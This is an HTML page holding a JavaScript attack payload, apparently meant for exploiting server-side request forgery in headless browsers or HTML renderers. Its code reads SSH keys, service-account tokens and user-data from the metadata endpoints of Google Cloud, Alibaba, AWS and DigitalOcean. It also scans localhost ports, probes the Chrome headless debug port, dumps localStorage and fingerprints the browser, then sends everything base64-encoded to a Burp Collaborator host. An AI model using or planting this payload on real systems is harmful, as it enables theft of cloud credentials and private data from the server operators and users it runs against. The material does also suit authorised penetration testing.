<html>
<head></head>
<body>
<script>
//Collaborator server to receive info
var collaboratorServer = "ysu632p7xzqy8028y8ymxmo3tuzkn9.burpcollaborator.net";

//Google Cloud
var googleMetadataServer = "metadata.google.internal";
var googleMetadataPaths = {"SSH-Keys: ": "/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json", "Service Accounts: ": "/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json", "Hostname: ": "/computeMetadata/v1/instance/hostname"}
var googleHeaders = {"X-Google-Metadata-Request": "true"}

//Alibaba Cloud
var alibabaMetadataServer = "100.100.100.200";
var alibabaMetadataPaths = {"SSH-Keys: ":"/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/hostname", "User-Data: ": "/latest/user-data"};

//Amazon AWS & D.O
var othersMetadataServers = "169.254.169.254";

//Amazon
var amazonMetadataPaths = {"SSH-Keys: ": "/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/public-hostname", "AMI-ID: ": "/latest/meta-data/ami-id"};

//Digital Ocean
var digitalOceanPaths = {"User-data": "/metadata/v1/user-data", "Hostname: ": "/metadata/v1/hostname", "SSH-Keys: ": "/metadata/v1/public-keys"}

//Commun ports
var communPorts = [80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017]

function cloudMetadata(metadataServer, matadataPaths, headers){
    for (const [key, value] of Object.entries(matadataPaths)) {
        log(key + makeRequest("http://" + metadataServer + value, "GET", headers));
    }
}

function checkPort(scheme, ip, port){
    var img = new Image();
    var baseUrl = scheme + ip + ":" + port.toString();

    img.onload = function () {
        log("Open port: " + baseUrl);
    };

    img.src = baseUrl + "/favicon.ico";
}

function portScanner(ip, ports){
    schemes = ["http://", "https://"]
 
    for (i=0; i<ports.length; i++){
        port = ports[i];
        schemes.forEach((scheme) =>{
            checkPort(scheme, ip, port);
        });
    }
}

function getBrowserInfo(){
	var allInfo = "";
	allInfo += navigator.appName + " |=| ";
	allInfo += navigator.appVersion + " |=| ";
	allInfo += navigator.platform + " |=| ";
	allInfo += navigator.userAgent + " |=| ";
		   
	var plugins = navigator.plugins;
	allInfo += navigator.mimeTypes + " |=| ";
		   
	for (i=0;i<plugins.length;i++) {
	   var plugin = plugins[i];
	   allInfo += plugin.name + " |=| ";
	   allInfo += plugin.filename+' - '+plugin.description + " |=| ";
	   
           for(j=0;j<plugin.length;j++) {
	      var mimetype = plugin[j];
	      allInfo += mimetype.type + " |=| ";
	   
              if(mimetype.description) {
		 allInfo += mimetype.description + " |=| ";
	      }
	      if(mimetype.suffixes) {
		 allInfo += ' - extentions: '+mimetype.suffixes + " |=| ";
	      }
	   }
			
	}

    log("Browser Info: " + allInfo);
}

function chromeHeadless(){
    log("ChromeHeadless remote-debug, port 9222: " + makeRequest("http://127.0.0.1:9222", "GET", {}));
    log("ChromeHeadless remote-debug, port 3389: " + makeRequest("http://127.0.0.1:3389", "GET", {}));
}

function localStorageLeak(){
	if (window.localStorage) {
	    if (localStorage.length) {s
		    var output;
		    for (var i = 0; i < localStorage.length; i++) {
		            if(i>0) { output += "&"; }
		            output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
		    }
		    log("LocalStorageLeak: " + output);
		}
	}
}

function log(data) {
    makeRequest("http://" + collaboratorServer + "/log?msg=" + btoa(data), "GET", {});
}

function makeRequest(url, method, headers) {
    try {
        var req = new XMLHttpRequest();
        req.open(method, url, false);
        
        for (const [key, value] of Object.entries(headers)) {
            req.setRequestHeader(key, value);
        }
        
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return "Request failed, status-code: " + req.status.toString();
    } catch(err) {
        //log("Request error: " + err.toString());
    }
    return null;
}

//Log Javascript enabled and triggered
log('Triggered in ' + window.location.href);

//Browser Storage Leak
//localStorageLeak();

//Try to fetch Chrome Headless debug port
//chromeHeadless();

//Get browser information (Plugins, versions, etc ...)
//getBrowserInfo();

//GET Cloud metadata information
//cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);

//Local port scanner
//portScanner("127.0.0.1", communPorts);

</script>
</body>
</html>
